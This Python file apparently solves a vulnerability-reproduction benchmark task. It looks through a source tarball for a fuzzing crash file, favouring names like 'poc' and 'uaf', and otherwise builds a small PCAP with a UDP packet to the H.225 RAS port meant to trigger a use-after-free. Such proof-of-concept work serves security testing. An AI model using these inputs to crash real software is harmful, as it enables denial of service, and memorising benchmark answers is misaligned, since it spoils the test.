import os
import tarfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = None
        try:
            poc = self._extract_poc_from_tar(src_path)
        except Exception:
            poc = None
        if poc is not None and isinstance(poc, (bytes, bytearray)) and len(poc) > 0:
            return bytes(poc)
        return self._build_default_poc()

    def _extract_poc_from_tar(self, src_path: str) -> bytes | None:
        if not os.path.exists(src_path):
            return None

        best_member = None
        best_score = float("-inf")

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    size = m.size
                    # Ignore empty or very large files
                    if size <= 0 or size > 65536:
                        continue

                    lname = m.name.lower()
                    score = 0

                    # Prefer sizes close to 73 bytes
                    if size == 73:
                        score += 1000
                    score += max(0, 200 - abs(size - 73))

                    root, ext = os.path.splitext(lname)

                    text_exts = {
                        ".c", ".h", ".hpp", ".hh", ".cpp", ".cc", ".cxx",
                        ".py", ".sh", ".bash", ".zsh",
                        ".txt", ".md", ".rst",
                        ".html", ".htm", ".xml", ".json", ".yml", ".yaml",
                        ".ini", ".cfg", ".conf",
                        ".in", ".ac", ".am", ".m4",
                        ".cmake", ".java", ".php", ".rb", ".pl", ".go",
                        ".ts", ".js", ".css", ".scss", ".lua",
                    }
                    if ext in text_exts:
                        score -= 300

                    binary_bonus_exts = {
                        ".pcap": 150,
                        ".pcapng": 140,
                        ".cap": 130,
                        ".bin": 120,
                        ".raw": 110,
                        ".dat": 100,
                        ".dump": 90,
                        ".pkt": 90,
                        ".frame": 80,
                        ".out": 60,
                    }
                    score += binary_bonus_exts.get(ext, 0)

                    kw_poc = [
                        "poc", "crash", "id_", "id:", "uaf",
                        "use-after-free", "use_after_free", "heap-uaf",
                        "heap-use-after-free", "heap_use_after_free",
                        "testcase", "repro", "reproducer",
                        "clusterfuzz", "minimized", "crashes",
                    ]
                    for kw in kw_poc:
                        if kw in lname:
                            score += 150

                    kw_proto = ["h225", "h.225", "ras"]
                    for kw in kw_proto:
                        if kw in lname:
                            score += 120

                    kw_test_dirs = [
                        "test", "tests", "regress", "regression",
                        "fuzz", "corpus", "inputs", "input",
                        "seed", "seeds", "cases", "examples", "example",
                        "sample", "samples",
                    ]
                    # Check directory components
                    path_with_slashes = "/" + lname
                    for kw in kw_test_dirs:
                        if f"/{kw}/" in path_with_slashes:
                            score += 60

                    # Slight preference for binary-looking names without extension
                    if ext == "" and not lname.endswith("/"):
                        if any(k in lname for k in ("id_", "id:", "packet", "pcap", "bin", "h225", "ras")):
                            score += 40

                    if score > best_score:
                        best_score = score
                        best_member = m

                if best_member is not None:
                    f = tf.extractfile(best_member)
                    if f is not None:
                        data = f.read()
                        if isinstance(data, (bytes, bytearray)) and len(data) > 0:
                            return bytes(data)
        except tarfile.ReadError:
            return None
        except Exception:
            return None

        return None

    def _build_default_poc(self) -> bytes:
        # Construct a minimal PCAP with a single IPv4/UDP packet to port 1719 (H.225 RAS)
        # Global header (pcap, little-endian, LINKTYPE_RAW)
        pcap_global = struct.pack(
            "<IHHIIII",
            0xA1B2C3D4,  # magic number (little-endian)
            2,           # version major
            4,           # version minor
            0,           # thiszone
            0,           # sigfigs
            65535,       # snaplen
            101,         # network: LINKTYPE_RAW (IPv4)
        )

        # IPv4 header (20 bytes)
        # Version/IHL=0x45, TOS=0x00, Total Length=0x0021 (33 bytes)
        # ID=0x0000, Flags/Frag=0x0000, TTL=64, Protocol=17 (UDP)
        # Header checksum computed for this header: 0x66CA
        ip_header = bytes(
            [
                0x45, 0x00, 0x00, 0x21,  # v4, ihl, tos, total length (33)
                0x00, 0x00,              # identification
                0x00, 0x00,              # flags, fragment offset
                0x40,                    # TTL
                0x11,                    # protocol (UDP)
                0x66, 0xCA,              # header checksum
                0x0A, 0x00, 0x00, 0x01,  # src IP 10.0.0.1
                0x0A, 0x00, 0x00, 0x02,  # dst IP 10.0.0.2
            ]
        )

        # UDP header (8 bytes)
        # src port 1234, dst port 1719 (H.225 RAS), length 13, checksum 0
        udp_header = bytes(
            [
                0x04, 0xD2,  # source port 1234
                0x06, 0xB7,  # dest port 1719
                0x00, 0x0D,  # length = 13 (8 UDP + 5 payload)
                0x00, 0x00,  # checksum
            ]
        )

        # Minimal payload (5 bytes) - arbitrary; crafted size to hit total length 33
        payload = b"\x01\x00\x00\x00\x00"

        frame = ip_header + udp_header + payload
        frame_len = len(frame)  # should be 33

        # Packet header
        pcap_packet_header = struct.pack(
            "<IIII",
            0,          # ts_sec
            0,          # ts_usec
            frame_len,  # incl_len
            frame_len,  # orig_len
        )

        poc = pcap_global + pcap_packet_header + frame
        return poc
